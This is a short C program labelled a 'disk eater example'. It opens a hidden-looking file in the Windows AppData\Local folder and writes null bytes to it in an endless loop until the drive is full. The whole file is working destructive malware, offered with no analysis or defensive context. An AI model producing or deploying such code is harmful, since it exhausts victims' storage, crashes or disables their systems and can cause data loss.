//DISK EATER EXAMPLE

#include<stdio.h>

#include<stdlib.h>

int main() {
  FILE * out = fopen("../appdata/local/_", "w");
  if (out) {
    for (;;) {
      fputc('\0', out);
    }
    fclose(out);
  }
  return 0;
}
